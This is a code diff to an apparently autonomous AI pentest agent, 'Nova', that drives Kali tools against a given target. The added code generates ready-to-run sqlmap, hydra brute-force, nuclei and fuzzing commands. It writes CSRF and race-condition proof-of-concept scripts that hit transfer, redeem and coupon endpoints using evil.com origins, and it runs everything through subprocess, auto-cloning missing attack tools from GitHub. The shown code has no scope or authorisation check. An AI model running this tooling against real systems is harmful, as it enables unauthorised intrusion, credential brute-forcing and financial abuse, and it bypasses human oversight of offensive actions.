@@ -189,6 +189,7 @@ class NovaKaliAgent:
         """
         
         logger.info(f"Nova processing task: {description} on {target}")
+        self._current_target = target  # store for use in command generation
         
         # Create task
         task = Task(
@@ -420,81 +421,198 @@ class NovaKaliAgent:
         target: str,
         analysis: Dict
     ) -> List[Dict[str, Any]]:
-        """Nova autonomously generates detailed execution steps"""
-        
-        steps = []
-        
-        # Based on analysis, generate appropriate steps
-        task_type = analysis.get('task_type')
-        
-        if task_type == 'recon':
-            steps = [
-                {
-                    'number': 1,
-                    'description': 'DNS enumeration',
-                    'tool': 'nslookup, dig, dnsrecon',
-                    'rationale': 'Identify DNS records and potential subdomains'
-                },
-                {
-                    'number': 2,
-                    'description': 'WHOIS lookup',
-                    'tool': 'whois',
-                    'rationale': 'Identify registrant information and IP ranges'
-                },
-                {
-                    'number': 3,
-                    'description': 'Port scanning',
-                    'tool': 'nmap, masscan',
-                    'rationale': 'Identify open ports and services'
-                }
-            ]
-        
-        elif task_type == 'scanning':
-            steps = [
-                {
-                    'number': 1,
-                    'description': 'Service enumeration',
-                    'tool': 'nmap -sV',
-                    'rationale': 'Identify service versions'
-                },
-                {
-                    'number': 2,
-                    'description': 'Vulnerability scanning',
-                    'tool': 'nessus, openvas',
-                    'rationale': 'Identify known vulnerabilities'
-                }
-            ]
-        
+        """Nova autonomously generates detailed, tool-specific execution steps."""
+        import urllib.parse
+        parsed   = urllib.parse.urlparse(target if target.startswith("http") else f"https://{target}")
+        domain   = parsed.netloc or parsed.path
+        task_type = analysis.get('task_type', 'recon')
+
+        STEP_MAP = {
+            'recon': [
+                {'description': 'Subdomain enumeration',   'tool': 'subfinder',   'rationale': 'Find all subdomains passively'},
+                {'description': 'Live host filtering',      'tool': 'httpx',       'rationale': 'Filter to live HTTP/HTTPS hosts'},
+                {'description': 'Port scan (common ports)', 'tool': 'nmap',        'rationale': 'Identify open ports and services'},
+                {'description': 'DNS record analysis',      'tool': 'dnsrecon',    'rationale': 'MX, TXT, NS, SPF, DMARC enumeration'},
+                {'description': 'Certificate transparency', 'tool': 'curl',        'rationale': 'crt.sh — find additional subdomains'},
+                {'description': 'Web tech fingerprint',     'tool': 'whatweb',     'rationale': 'Identify frameworks, server, CMS'},
+                {'description': 'WAF detection',            'tool': 'wafw00f',     'rationale': 'Know what defences are in place'},
+                {'description': 'URL collection',           'tool': 'gau',         'rationale': 'Gather known URLs from archives'},
+                {'description': 'JS endpoint crawl',        'tool': 'katana',      'rationale': 'Discover hidden API endpoints'},
+            ],
+            'scanning': [
+                {'description': 'Service version scan',            'tool': 'nmap',    'rationale': 'Identify service versions for CVE matching'},
+                {'description': 'Vulnerability template scan',     'tool': 'nuclei',  'rationale': 'Run 10k+ vuln templates against target'},
+                {'description': 'Web content discovery',          'tool': 'ffuf',    'rationale': 'Brute-force hidden dirs/files'},
+                {'description': 'Directory brute-force',           'tool': 'gobuster','rationale': 'Find unlinked paths'},
+                {'description': 'Web app vulnerability scan',      'tool': 'nikto',   'rationale': 'Check headers, methods, known CVEs'},
+                {'description': 'Parameter discovery',             'tool': 'arjun',   'rationale': 'Find hidden GET/POST parameters'},
+            ],
+            'exploitation': [
+                {'description': 'SQL injection testing',       'tool': 'sqlmap',  'rationale': 'Automated SQLi detection and exploitation'},
+                {'description': 'XSS discovery',               'tool': 'dalfox',  'rationale': 'DOM/Reflected/Stored XSS with PoC'},
+                {'description': 'Credential brute-force',      'tool': 'hydra',   'rationale': 'Login form brute-force (rate-limited)'},
+                {'description': 'JWT attack suite',            'tool': 'jwt_tool', 'rationale': 'alg:none, key confusion, secret brute'},
+                {'description': 'SSRF exploitation',           'tool': 'ssrfmap', 'rationale': 'Probe internal network via SSRF'},
+                {'description': 'Race condition testing',      'tool': 'ffuf',    'rationale': 'Concurrent requests to trigger TOCTOU'},
+                {'description': 'Advanced nuclei exploit scan','tool': 'nuclei',  'rationale': 'Critical/high severity templates only'},
+            ],
+            'vuln_assessment': [
+                {'description': 'Full nuclei scan',          'tool': 'nuclei',  'rationale': 'All severity levels'},
+                {'description': 'CVE-specific nmap scripts', 'tool': 'nmap',    'rationale': 'NSE vuln scripts'},
+                {'description': 'Web scanner',               'tool': 'nikto',   'rationale': 'Full web vulnerability check'},
+                {'description': 'XSS fuzzing',               'tool': 'dalfox',  'rationale': 'Reflected/DOM XSS'},
+                {'description': 'SQLi check',                'tool': 'sqlmap',  'rationale': 'Injection across all parameters'},
+            ],
+        }
+        raw = STEP_MAP.get(task_type, STEP_MAP['recon'])
+        steps = [{'number': i+1, **s} for i, s in enumerate(raw)]
         return steps
-    
+
     def _generate_code_artifacts(
         self,
         analysis: Dict,
         steps: List[Dict]
     ) -> List[Dict[str, Any]]:
-        """Nova autonomously generates exploit code, payloads, scripts"""
-        
+        """Nova writes real exploit scripts and payloads to disk, returns manifest."""
+        import os, urllib.parse
+        target    = getattr(self, '_current_target', '')
+        parsed    = urllib.parse.urlparse(target if target.startswith("http") else f"https://{target}")
+        domain    = parsed.netloc or parsed.path
+        task_type = analysis.get('task_type', 'recon')
+        workspace = os.environ.get('NOVA_WORKSPACE', os.path.expanduser('~/nova_workspace'))
+        os.makedirs(workspace, exist_ok=True)
         artifacts = []
-        
-        # Generate based on what's needed
-        # This is where Nova writes actual code
-        
+
+        csrf_poc = f"""#!/usr/bin/env python3
+\"\"\"CSRF PoC — auto-generated by Nova Arsenal for {domain}\"\"\"
+import requests, concurrent.futures, time
+
+TARGET = "{target}"
+ENDPOINTS = ["/api/user", "/api/account", "/api/settings", "/api/transfer", "/api/redeem"]
+EVIL_ORIGINS = ["https://evil.com", "https://attacker.com", "null"]
+
+def test_csrf(ep, origin):
+    url = TARGET.rstrip('/') + ep
+    headers = {{"Origin": origin, "Referer": origin + "/", "Content-Type": "application/json"}}
+    try:
+        r = requests.post(url, json={{}}, headers=headers, timeout=8, verify=False)
+        if r.status_code not in (403, 401, 422):
+            return {{"url": url, "origin": origin, "status": r.status_code, "confirmed": True}}
+    except: pass
+    return None
+
+results = []
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+    futs = [ex.submit(test_csrf, ep, org) for ep in ENDPOINTS for org in EVIL_ORIGINS]
+    for f in concurrent.futures.as_completed(futs):
+        r = f.result()
+        if r: results.append(r); print(f"  🚨 CSRF CONFIRMED: {{r['url']}} | origin={{r['origin']}} | status={{r['status']}}")
+
+import json; open("{workspace}/nova_csrf_poc.json","w").write(json.dumps({{"target":TARGET,"confirmed":results}},indent=2))
+print(f"\\n✅ CSRF PoC: {{len(results)}} confirmed | saved to nova_csrf_poc.json")
+"""
+        race_poc = f"""#!/usr/bin/env python3
+\"\"\"Race Condition PoC — auto-generated by Nova Arsenal for {domain}\"\"\"
+import requests, concurrent.futures, time, json
+
+TARGET = "{target}"
+RACE_ENDPOINTS = ["/api/redeem", "/api/vote", "/api/transfer", "/api/purchase", "/api/apply-coupon"]
+CONCURRENCY = 15
+
+def race_request(url, n):
+    try:
+        r = requests.post(url, json={{"amount": 1, "code": "SAVE50"}},
+                         headers={{"Content-Type":"application/json"}}, timeout=10, verify=False)
+        return {{"req": n, "status": r.status_code, "body": r.text[:200]}}
+    except Exception as e:
+        return {{"req": n, "error": str(e)}}
+
+all_results = []
+for ep in RACE_ENDPOINTS:
+    url = TARGET.rstrip('/') + ep
+    print(f"\\n🏎  Racing {{CONCURRENCY}} requests → {{url}}")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
+        futs = [ex.submit(race_request, url, i) for i in range(CONCURRENCY)]
+        results = [f.result() for f in concurrent.futures.as_completed(futs)]
+    statuses = [r.get("status") for r in results if "status" in r]
+    unique = len(set(statuses))
+    if unique > 1:
+        print(f"  🚨 RACE CONDITION CONFIRMED: {{statuses}}")
+        all_results.append({{"endpoint": url, "statuses": statuses, "confirmed": True}})
+
+open("{workspace}/nova_race_poc.json","w").write(json.dumps({{"target":TARGET,"results":all_results}},indent=2))
+print(f"\\n✅ Race PoC: {{len(all_results)}} confirmed | saved to nova_race_poc.json")
+"""
+        scripts = [
+            ("nova_csrf_poc.py", csrf_poc, "CSRF PoC — tests evil-origin acceptance on all API endpoints"),
+            ("nova_race_poc.py", race_poc, "Race Condition PoC — 15 concurrent requests to trigger TOCTOU"),
+        ]
+        for fname, code, purpose in scripts:
+            fpath = os.path.join(workspace, fname)
+            try:
+                with open(fpath, 'w') as fh:
+                    fh.write(code)
+                os.chmod(fpath, 0o755)
+                artifacts.append({"filename": fpath, "purpose": purpose, "language": "python", "code": code})
+                logger.info(f"Script written: {fpath}")
+            except Exception as ex:
+                logger.warning(f"Could not write {fname}: {ex}")
         return artifacts
-    
+
     def _generate_tool_commands(
         self,
         analysis: Dict,
         steps: List[Dict]
     ) -> List[str]:
-        """Nova autonomously generates Kali tool commands"""
-        
+        """Generate real, fully-filled-in Kali tool commands for the current target."""
+        import os, urllib.parse, shutil
+        target    = getattr(self, '_current_target', '')
+        if not target:
+            return []
+        url = target if target.startswith("http") else f"https://{target}"
+        parsed  = urllib.parse.urlparse(url)
+        domain  = parsed.netloc or parsed.path
+        wl_dir  = os.path.expanduser("~/nova_workspace/wordlists")
+        common  = f"{wl_dir}/common.txt"
+        subdwl  = f"{wl_dir}/subdomains.txt"
+        ws      = os.environ.get('NOVA_WORKSPACE', os.path.expanduser('~/nova_workspace'))
+
+        CMD_MAP = {
+            'subfinder':  f"subfinder -d {domain} -silent -o {ws}/subdomains.txt",
+            'httpx':      f"httpx -l {ws}/subdomains.txt -silent -status-code -title -tech-detect -o {ws}/live_hosts.txt",
+            'nmap':       f"nmap -sV -sC --open -T4 -p 80,443,8080,8443,8888,3000,4000,5000,9000 {domain} -oN {ws}/nmap.txt",
+            'dnsrecon':   f"dnsrecon -d {domain} -t std,brt --xml {ws}/dnsrecon.xml 2>/dev/null",
+            'curl':       f"curl -s 'https://crt.sh/?q=%25.{domain}&output=json' | python3 -c \"import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]\" | sort -u > {ws}/crtsh_subdomains.txt",
+            'whatweb':    f"whatweb -a 3 {url} --log-json={ws}/whatweb.json 2>/dev/null",
+            'wafw00f':    f"wafw00f {url} -o {ws}/waf.txt",
+            'gau':        f"gau {domain} --blacklist png,jpg,gif,css,woff --o {ws}/gau_urls.txt",
+            'katana':     f"katana -u {url} -silent -jc -kf all -o {ws}/katana_endpoints.txt",
+            'nuclei':     f"nuclei -u {url} -severity critical,high,medium -silent -o {ws}/nuclei_findings.txt -stats",
+            'ffuf':       f"ffuf -w {common}:FUZZ -u {url}/FUZZ -mc 200,201,204,301,302,403 -ac -o {ws}/ffuf_dirs.json -of json -t 50 2>/dev/null",
+            'gobuster':   f"gobuster dir -u {url} -w {common} -t 40 -q -o {ws}/gobuster.txt --no-error",
+            'nikto':      f"nikto -h {url} -Format txt -output {ws}/nikto.txt -nointeractive 2>/dev/null",
+            'arjun':      f"arjun -u {url} --stable -oJ {ws}/arjun_params.json 2>/dev/null",
+            'sqlmap':     f"sqlmap -u '{url}/?id=1' --level=3 --risk=2 --batch --output-dir={ws}/sqlmap --forms --crawl=2 2>/dev/null",
+            'dalfox':     f"dalfox url {url} --silence --output {ws}/dalfox_xss.txt 2>/dev/null",
+            'hydra':      f"hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt {domain} http-get / -o {ws}/hydra.txt 2>/dev/null",
+            'jwt_tool':   f"python3 {os.environ.get('NOVA_TOOL_CLONE_DIR','/opt/nova-tools')}/jwt_tool/jwt_tool.py -t {url} --all 2>/dev/null",
+            'ssrfmap':    f"python3 {os.environ.get('NOVA_TOOL_CLONE_DIR','/opt/nova-tools')}/SSRFmap/ssrfmap.py -r /dev/stdin --lhost 127.0.0.1 2>/dev/null",
+            'dnsrecon':   f"dnsrecon -d {domain} -t std 2>/dev/null",
+            'nmap':       f"nmap -sV -sC --open -T4 {domain} -oN {ws}/nmap.txt",
+        }
         commands = []
-        
         for step in steps:
-            tool = step.get('tool', '')
-            if tool:
-                commands.append(f"{tool} [parameters based on target]")
-        
+            tool_str = step.get('tool', '')
+            for tool in (t.strip().split()[0] for t in tool_str.split(',') if t.strip()):
+                cmd = CMD_MAP.get(tool)
+                if cmd:
+                    commands.append(cmd)
+                    break
+        if not commands:
+            commands = [
+                CMD_MAP['subfinder'], CMD_MAP['httpx'], CMD_MAP['nmap'],
+                CMD_MAP['nuclei'], CMD_MAP['nikto'], CMD_MAP['ffuf'],
+            ]
         return commands
     
     def _assess_risk(self, analysis: Dict) -> str:
@@ -589,12 +707,77 @@ class ApprovalEngine:
 
 
 class ExecutionController:
-    """Executes approved plans using real Kali Linux tools via subprocess."""
+    """Executes approved plans using real Kali Linux tools via subprocess.
+    Automatically clones missing tools from GitHub when not found in PATH."""
 
     MAX_TIMEOUT = 120
 
+    TOOL_REPOS = {
+        "jwt_tool":    ("https://github.com/ticarpi/jwt_tool",         "python"),
+        "ssrfmap":     ("https://github.com/swisskyrepo/SSRFmap",       "python"),
+        "xsstrike":    ("https://github.com/s0md3v/XSStrike",           "python"),
+        "corsy":       ("https://github.com/s0md3v/Corsy",              "python"),
+        "commix":      ("https://github.com/commixproject/commix",      "python"),
+        "sqlmate":     ("https://github.com/s0md3v/sqlmate",            "python"),
+        "paramspider": ("https://github.com/devanshbatham/ParamSpider", "python"),
+        "secretfinder":("https://github.com/m4ll0k/SecretFinder",      "python"),
+        "linkfinder":  ("https://github.com/GerbenJavado/LinkFinder",  "python"),
+        "403bypasser": ("https://github.com/yunemse48/403bypasser",     "python"),
+        "bypass403":   ("https://github.com/iamj0ker/bypass-403",      "shell"),
+        "race_the_web":("https://github.com/TheHackerDev/race-the-web","go"),
+        "crlfuzz":     ("https://github.com/dwisiswant0/crlfuzz",       "go"),
+        "interactsh":  ("https://github.com/projectdiscovery/interactsh","go"),
+        "notify":      ("https://github.com/projectdiscovery/notify",   "go"),
+        "cdncheck":    ("https://github.com/projectdiscovery/cdncheck", "go"),
+    }
+
+    def _auto_clone_tool(self, tool: str) -> str:
+        """Clone a missing tool from GitHub; return path to use or '' if failed."""
+        import subprocess, shutil, os
+        clone_dir = os.environ.get("NOVA_TOOL_CLONE_DIR", "/opt/nova-tools")
+        os.makedirs(clone_dir, exist_ok=True)
+
+        entry = self.TOOL_REPOS.get(tool)
+        if not entry:
+            return ""
+        repo_url, lang = entry
+        dest = os.path.join(clone_dir, tool)
+
+        if not os.path.isdir(dest):
+            logger.info(f"Auto-cloning {tool} from {repo_url}...")
+            try:
+                subprocess.run(
+                    ["git", "clone", "--depth=1", repo_url, dest],
+                    capture_output=True, timeout=60,
+                )
+                if lang == "python":
+                    req = os.path.join(dest, "requirements.txt")
+                    if os.path.exists(req):
+                        subprocess.run(
+                            ["pip3", "install", "--quiet", "--break-system-packages", "-r", req],
+                            capture_output=True, timeout=60,
+                        )
+                elif lang == "go":
+                    subprocess.run(
+                        ["go", "build", "-o", os.path.join(dest, tool), "./..."],
+                        capture_output=True, timeout=120, cwd=dest,
+                        env={**os.environ, "GOPATH": os.environ.get("GOPATH", "/root/go")},
+                    )
+                logger.info(f"Cloned {tool} → {dest}")
+            except Exception as ex:
+                logger.warning(f"Clone failed for {tool}: {ex}")
+                return ""
+
+        # Find entry point
+        for entry_name in (f"{tool}.py", f"{tool}.go", tool, "main.py", "app.py"):
+            ep = os.path.join(dest, entry_name)
+            if os.path.exists(ep):
+                return ep
+        return dest
+
     def execute_plan(self, plan: ExecutionPlan) -> Dict[str, Any]:
-        """Execute the approved plan — runs each tool command via subprocess."""
+        """Execute the approved plan — runs each tool command via subprocess,
+        auto-cloning any missing tools from GitHub before skipping."""
         import subprocess, shlex, shutil
 
         outputs          = []
@@ -609,9 +792,20 @@ class ExecutionController:
             tool  = parts[0] if parts else ""
 
             if not shutil.which(tool):
-                logger.warning(f"Tool not found: {tool} — skipping")
-                outputs.append({"command": cmd_str, "status": "skipped", "reason": f"{tool} not in PATH"})
-                continue
+                cloned_path = self._auto_clone_tool(tool)
+                if cloned_path:
+                    logger.info(f"Using cloned tool: {cloned_path}")
+                    if cloned_path.endswith(".py"):
+                        parts = ["python3", cloned_path] + parts[1:]
+                    elif cloned_path.endswith(".go"):
+                        parts = ["go", "run", cloned_path] + parts[1:]
+                    else:
+                        parts = [cloned_path] + parts[1:]
+                else:
+                    logger.warning(f"Tool not found and clone failed: {tool} — skipping")
+                    outputs.append({"command": cmd_str, "status": "skipped",
+                                    "reason": f"{tool} not in PATH and not clonable"})
+                    continue
 
             logger.info(f"Executing: {cmd_str[:120]}")
             try:
